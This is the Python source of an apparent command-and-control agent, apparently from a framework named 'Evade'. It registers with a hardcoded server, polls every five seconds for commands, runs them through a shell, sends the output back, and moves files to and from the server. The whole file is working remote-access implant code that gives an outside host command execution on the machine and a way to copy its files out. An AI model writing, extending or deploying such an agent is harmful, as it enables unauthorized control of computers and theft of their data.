import requests
import subprocess
import time
import uuid
import os
import sys

#SERVER_CERT=r'E:\Github\Repos\Evade-A-C2-Framework\test\https_complete\server.crt'

SERVER_URL = 'https://10.10.2.214:5001'
AGENT_ID = str(uuid.uuid4())
REGISTER_ENDPOINT = f'{SERVER_URL}/register'
COMMAND_ENDPOINT = f'{SERVER_URL}/get_command'
OUTPUT_ENDPOINT = f'{SERVER_URL}/send_output'
#DOWNLOAD_DIR = 'downloads'  # Directory to save downloaded files

#os.makedirs(DOWNLOAD_DIR, exist_ok=True)

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    
    return os.path.join(base_path, relative_path)

SERVER_CERT = resource_path('server.crt')

def execute_command(command):
    if command.startswith("download "):
        # This is a command for the agent to upload a file to the server
        filename = command.split(" ", 1)[1]
        return upload_file_to_server(filename)
    elif command.startswith("upload "):
        # This is a command for the agent to download a file from the server
        filename = command.split(" ", 1)[1]
        return download_file_from_server(filename)
    else:
        # Handle other commands as before
        try:
            result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            return f"Error executing command: {e}"
        except Exception as e:
            return f"Error: {e}"

def upload_file_to_server(filename):
    # Change here to check the file in the current directory instead of DOWNLOAD_DIR
    file_path = filename
    
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            files = {'file': (filename, f)}
            response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, verify=SERVER_CERT, allow_redirects=True)
            if response.status_code == 200:
                return "File Downloaded successfully."
            else:
                return f"Failed to Download file. Status: {response.status_code}, Response: {response.text}"
    else:
        return "File does not exist."

def download_file_from_server(filename):
    # Adjust to the new server endpoint for fetching files
    download_url = f"{SERVER_URL}/fetch_file/{AGENT_ID}/{filename}"
    response = requests.get(download_url, verify=SERVER_CERT, allow_redirects=True)
    if response.status_code == 200:
        file_path = os.path.join(os.getcwd(), filename)  # Save in the current working directory
        with open(file_path, 'wb') as f:
            f.write(response.content)
        return "File Uploaded successfully."
    else:
        return f"Failed to Upload file. Status: {response.status_code}, Response: {response.text}"

def send_output(output):
    try:
        response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, verify=SERVER_CERT, allow_redirects=True)
        print("Response Status:", response.status_code)
        print("Response Text:", response.text)
        if response.ok:
            print("Output sent successfully")
        else:
            print("Failed to send output")
    except requests.exceptions.RequestException as e:
        print(f"Request Error: {e}")


def register_agent():
    response = requests.post(REGISTER_ENDPOINT, data={'agent_id': AGENT_ID}, verify=SERVER_CERT, allow_redirects=True)
    if response.ok:
        print("Agent registered successfully")
    else:
        print("Failed to register agent")

def main():
    register_agent()
    while True:
        try:
            response = requests.get(COMMAND_ENDPOINT, params={'agent_id': AGENT_ID}, verify=SERVER_CERT, allow_redirects=True)
            if response.status_code == 200:
                command_to_execute = response.json().get('command', '')
                if command_to_execute:
                    output = execute_command(command_to_execute)
                    send_output(output)
            time.sleep(5)
        except requests.exceptions.RequestException as e:
            print(f"Network error: {e}")

if __name__ == "__main__":
    main()
